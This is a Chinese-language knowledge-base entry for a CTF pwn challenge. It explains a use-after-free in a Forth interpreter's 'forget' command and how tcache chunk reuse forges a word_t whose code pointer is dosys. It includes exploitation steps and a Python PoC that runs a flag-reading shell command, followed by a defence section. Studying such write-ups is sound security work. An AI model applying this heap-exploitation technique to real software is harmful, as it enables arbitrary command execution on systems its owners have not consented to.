---
id: binary-pwn-forth-dictionary-uaf-tcache-fake-word
title: Forth 解释器 forget 未检查引用计数：tcache 复用伪造 word_t 调 dosys
type: scenario
domain: binary
path: binary/pwn/heap
technique: forth-dictionary-uaf-tcache
aliases:
- spelling-bee
- Forth 解释器 UAF
- word_t 伪造
- tcache 0x30 0x90
- dosys 命令执行
tags:
- pwn
- heap
- uaf
- tcache
- forth
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V126
  verified_at: '2026-11-06T04:11:41+08:00'
  notes: 已对照原文 spelling-bee 段核对：word_t/dict_t 大小与 0x30/0x90 chunk、forget 不检查 referenced_by、30/127 字节名复用、fake code=dosys、dosys(cmd) 均一致；未跑附件。
---

## 一句话结论

Forth 解释器的 `forget` 释放单词时没有检查 `referenced_by`，导致已编译单词 `A` 的 `compile_def` 里留下指向被释放 `B.word` 的悬挂指针；利用 0x30/0x90 两个 tcache bin，把 `B.word` 伪造成 `code=dosys`、`param` 仍指向旧 `compile_def`，再把旧 `compile_def` 覆盖成命令字符串，执行 `A` 即可调用 `dosys("cat${IFS}flag*")`。

## 原理

- 结构体：`word_t { long flags; long length; long referenced_by; void (*code)(void*); void *param; }`，大小 40 字节（chunk 0x30）；`dict_t { char* name; word_t* word; dict_t* next; bool alloc_name; }` 约 0x20（chunk 0x30）。
- 编译单词时，`compile_def` 是 `malloc(16 * sizeof(word_t*)) = 0x80`（chunk 0x90），保存该单词引用到的 `word_t*`；`;` 时新建 `word_t`（`code=docol`, `param=compile_def`）并插入字典。
- `delete_word` 只 `free(w->param)`、`free(w)`、`free(name)`、`free(dict)`，不检查 `referenced_by`；`A` 的 `compile_def` 仍指向已释放的 `B.word`，形成 UAF。
- 0x30 bin 可复用于：新的 `word_t`、`dict_t`、30 字节的 `compile_name`；0x90 bin 可复用于：新的 `compile_def`、127 字节的 `compile_name`。
- 用 30 字节名字覆盖旧 `B.word`：前 24 字节填充，偏移 24 写入 `dosys` 的低 6 字节，`strcpy` 的 NUL 补齐高字节；偏移 32 的 `param` 未被覆盖，仍指向旧 `B.compile_def`。
- 用 127 字节名字复用旧 `B.compile_def`，写入 `cat${IFS}flag*;exit;` + 填充；执行 `A` 时 `docol` 取出 `B.word`，调用其 `code`（已变成 `dosys`）并传入 `param`（命令字符串）。

## 触发条件

- Forth 解释器支持 `: name ... ;` 与 `forget name`，且 `delete_word` 不检查引用计数。
- 能泄露 `dosys` 地址（题目直接打印）。
- glibc tcache 可用，0x30/0x90 分配可控，且名字长度可控（30/127 字节）。

## 利用步骤

1. 读取 banner 泄露的 `dosys` 地址。
2. 定义 `B`、`A`（`A` 引用 `B`），`forget B` 制造悬挂指针。
3. 用 `C`、127 字节临时名做 tcache 整理，确保 0x30/0x90 分配顺序可控。
4. 定义 30 字节名字 `fake_name`，复用旧 `B.word`，写入 `code=dosys`。
5. 定义 127 字节名字 `long_cmd`，复用旧 `B.compile_def`，写入命令。
6. 执行 `A`，触发 `dosys(cmd)`。

## PoC

```python
fake_name = b'A' * 24 + struct.pack('<Q', dosys)[:6]      # len 30
cmd = b'cat${IFS}flag*;exit;'
long_cmd = cmd + b'X' * (127 - len(cmd))                   # len 127

define(io, b'B', [b'1'])
define(io, b'A', [b'B'])
forget(io, b'B')

define(io, b'C', []); define(io, long_tmp, [])
forget(io, b'C'); forget(io, long_tmp); define(io, b'C', [])

define(io, fake_name, [])
define(io, long_cmd, [])
tok(io, b'A')   # -> dosys("cat${IFS}flag*;exit;XXXX...")
```

## 变体与关联

- 其他解释器/字典结构存在“释放未检查引用计数”时同样可 UAF。
- tcache 可换成 fastbin/unsorted bin，或改用堆溢出直接改写 `code`。
- 关联：[[binary-pwn-heap-tcache-poisoning]]（如存在）、[[binary-pwn-signed-index-scale-wrap-adjacent-fd]]（堆相邻对象改写）。

## 检测与防御

- 解释器在 `forget` 前检查 `referenced_by`，或使用引用计数/GC；释放后将指针置空。
- 启用 glibc 堆保护（tcache key、safe-linking、`MALLOC_CHECK_`）。
- 检测：Forth 输入中出现超长单词名（30/127 字节）、频繁 `forget` 后立即定义新单词、`dosys` 被非预期调用。
